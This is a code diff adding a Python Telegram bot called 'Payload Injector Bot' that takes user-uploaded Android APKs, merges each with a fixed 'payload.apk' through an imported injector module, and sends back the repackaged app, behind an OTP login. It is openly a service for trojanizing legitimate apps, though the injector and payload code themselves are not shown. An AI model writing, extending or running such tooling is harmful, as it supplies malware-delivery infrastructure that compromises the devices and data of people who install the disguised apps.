@@ -1,0 +1,288 @@
+from telethon import TelegramClient, events, Button
+import asyncio
+import os
+import sys
+import logging
+import time
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('logs/bot2_payload.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+if sys.platform == 'win32':
+    sys.stdout.reconfigure(encoding='utf-8')
+    sys.stderr.reconfigure(encoding='utf-8')
+
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+
+from modules.config import API_ID, API_HASH, BOT2_TOKEN
+from modules.auth import UserManager, request_otp, verify_otp
+from modules.utils import cleanup_session
+from modules.queue_manager import build_queue
+from modules.payload_injector import PayloadInjector
+
+# Ensure logs directory exists
+os.makedirs('logs', exist_ok=True)
+
+cleanup_session('data/bot2_session')
+user_manager = UserManager('data/users2.json')
+bot = TelegramClient('data/bot2_session', API_ID, API_HASH).start(bot_token=BOT2_TOKEN)
+
+# Payload APK path
+PAYLOAD_APK = "payload.apk"
+
+
+print("=" * 70)
+print("🎯 Payload Injector Bot - Professional Edition")
+print("=" * 70)
+
+
+@bot.on(events.NewMessage)
+async def handler(event):
+    user_id = event.sender_id
+    message = event.message
+    
+    # Check if message has a document (APK file)
+    if message.document:
+        if not user_manager.is_authenticated(user_id):
+            await event.reply("❌ **Access Denied**\n\nPlease authenticate first\n\n/start")
+            return
+        
+        # Check if it's an APK file
+        file_name = None
+        if message.document.attributes:
+            for attr in message.document.attributes:
+                if hasattr(attr, 'file_name'):
+                    file_name = attr.file_name
+                    break
+        
+        is_apk = False
+        if file_name and file_name.lower().endswith('.apk'):
+            is_apk = True
+        if message.document.mime_type == 'application/vnd.android.package-archive':
+            is_apk = True
+        
+        if is_apk:
+            # Check if user already processing
+            if build_queue.is_user_building(user_id):
+                elapsed = build_queue.get_user_elapsed_time(user_id)
+                await event.reply(
+                    f"⏳ **Already Processing**\n\n"
+                    f"⏱️ Time elapsed: {elapsed}s\n\n"
+                    f"Please wait for current process to complete..."
+                )
+                return
+            
+            # Process APK
+            await process_payload_injection(event, user_id, message)
+        else:
+            await event.reply(
+                "❌ **Invalid File Type**\n\n"
+                f"Please send an **APK file**\n\n"
+                f"📄 File: {file_name or 'Unknown'}\n"
+                f"📦 Type: {message.document.mime_type or 'Unknown'}"
+            )
+        return
+    
+    # Text messages
+    text = message.message.strip() if message.message else ""
+    
+    # Handle /start command
+    if text == '/start':
+        if user_manager.is_authenticated(user_id):
+            await event.reply(
+                "✨ **Welcome back, Creator!**\n\n"
+                "🎯 **Payload Injector Bot**\n\n"
+                "📤 Send me an APK file and I'll inject it into the payload!\n\n"
+                "━━━━━━━━━━━━━━━━\n"
+                "🔧 **Process:**\n"
+                "1. Send APK → 📥\n"
+                "2. Auto injection → 🔄\n"
+                "3. Get result → ✅\n\n"
+                "💡 Ready to start!"
+            )
+        else:
+            await event.reply(
+                "👋 **Welcome!**\n\n"
+                "🎯 **Payload Injector Bot**\n\n"
+                "🔐 Please authenticate to continue\n\n"
+                "📝 Send your **username** to get started"
+            )
+        return
+    
+    # If authenticated user sends any other message, ignore
+    if user_manager.is_authenticated(user_id):
+        return
+    
+    # Authentication flow
+    if user_id in user_manager.waiting_otp:
+        # Waiting for OTP
+        if text.isdigit() and len(text) == 6:
+            username = user_manager.waiting_otp[user_id]
+            success, msg = verify_otp(username, text)
+            
+            if success:
+                user_manager.add_user(user_id, username)
+                del user_manager.waiting_otp[user_id]
+                await event.reply(
+                    "✅ **Authentication Successful!**\n\n"
+                    "🎯 **Payload Injector Bot**\n\n"
+                    "📤 Send me an APK file to inject!"
+                )
+            else:
+                await event.reply(f"❌ {msg}\n\n📝 Please send your username again")
+                del user_manager.waiting_otp[user_id]
+        else:
+            await event.reply("❌ **Invalid code**\n\nPlease enter a valid 6-digit code")
+    else:
+        # Request OTP
+        username = text
+        await event.reply("📨 **Sending verification code...**")
+        success, msg = request_otp(username)
+        
+        if success:
+            user_manager.waiting_otp[user_id] = username
+            await event.reply(
+                f"✅ **Code delivered!**\n\n"
+                f"🔐 Enter your 6-digit code"
+            )
+        else:
+            await event.reply(f"❌ {msg}\n\nPlease try again")
+
+
+async def process_payload_injection(event, user_id, message):
+    """Process APK and inject into payload"""
+    msg = None
+    user_apk_path = None
+    final_apk_path = None
+    
+    try:
+        await build_queue.acquire(user_id)
+        
+        # Get file info
+        file_name = message.document.attributes[0].file_name if message.document.attributes else "app.apk"
+        file_size = message.document.size
+        
+        # Send initial message
+        msg = await event.reply(
+            f"🚀 **Payload Injection Started**\n\n"
+            f"📄 File: {file_name}\n"
+            f"💾 Size: {format_size(file_size)}\n\n"
+            f"📥 Downloading..."
+        )
+        
+        # Generate unique filename
+        timestamp = int(time.time())
+        downloads_dir = "downloads"
+        os.makedirs(downloads_dir, exist_ok=True)
+        
+        user_apk_path = os.path.join(downloads_dir, f"user_{user_id}_{timestamp}.apk")
+        
+        # Download APK from Telegram
+        last_update = [0]
+        
+        async def progress_callback(current, total):
+            progress = (current / total) * 100
+            if progress - last_update[0] >= 10:
+                last_update[0] = progress
+                await msg.edit(
+                    f"🚀 **Payload Injection Started**\n\n"
+                    f"📄 File: {file_name}\n"
+                    f"📥 Downloading: {progress:.1f}%\n"
+                    f"⬇️ {format_size(current)} / {format_size(total)}"
+                )
+        
+        await bot.download_media(
+            message.document,
+            file=user_apk_path,
+            progress_callback=progress_callback
+        )
+        
+        # Update message - injection started
+        await msg.edit(
+            "🔄 **Processing...**\n\n"
+            "⚙️ Step 1/6: Decompiling payload...\n"
+            "⏳ Please wait..."
+        )
+        
+        # Inject payload
+        builds_dir = "builds"
+        os.makedirs(builds_dir, exist_ok=True)
+        output_apk = os.path.join(builds_dir, f"payload_{user_id}_{timestamp}.apk")
+        
+        injector = PayloadInjector(PAYLOAD_APK)
+        final_apk_path, error = await injector.inject(user_apk_path, output_apk)
+        
+        if error or not final_apk_path:
+            await msg.edit(
+                f"❌ **Injection Failed**\n\n"
+                f"Error: {error or 'Unknown error'}\n\n"
+                f"Please try again or contact support"
+            )
+            return
+        
+        # Get final file size
+        final_size = os.path.getsize(final_apk_path)
+        
+        # Send final APK
+        await msg.edit(
+            "✅ **Injection Complete!**\n\n"
+            "📤 Uploading final APK..."
+        )
+        
+        await bot.send_file(
+            event.chat_id,
+            final_apk_path,
+            caption=(
+                "✅ **Payload Injection Successful!**\n\n"
+                f"📱 Original: {format_size(file_size)}\n"
+                f"📦 Final: {format_size(final_size)}\n\n"
+                "🎯 **Payload Injector Bot**"
+            )
+        )
+        
+        await msg.delete()
+        logger.info(f"✅ Payload injection complete for user {user_id}")
+        
+    except Exception as e:
+        logger.error(f"Process error: {str(e)}", exc_info=True)
+        if msg:
+            await msg.edit(
+                f"❌ **Error**\n\n"
+                f"{str(e)}\n\n"
+                f"Please try again"
+            )
+    finally:
+        build_queue.release(user_id)
+        
+        # Cleanup temporary files
+        try:
+            if user_apk_path and os.path.exists(user_apk_path):
+                os.remove(user_apk_path)
+                logger.info(f"Cleaned user APK: {user_apk_path}")
+            
+            if final_apk_path and os.path.exists(final_apk_path):
+                os.remove(final_apk_path)
+                logger.info(f"Cleaned final APK: {final_apk_path}")
+        except:
+            pass
+
+
+def format_size(bytes_size):
+    """Format bytes to human readable"""
+    for unit in ['B', 'KB', 'MB', 'GB']:
+        if bytes_size < 1024.0:
+            return f"{bytes_size:.1f} {unit}"
+        bytes_size /= 1024.0
+    return f"{bytes_size:.1f} TB"
+
+
+if __name__ == '__main__':
+    logger.info("Bot2 (Payload Injector) started and ready!")
+    bot.run_until_disconnected()
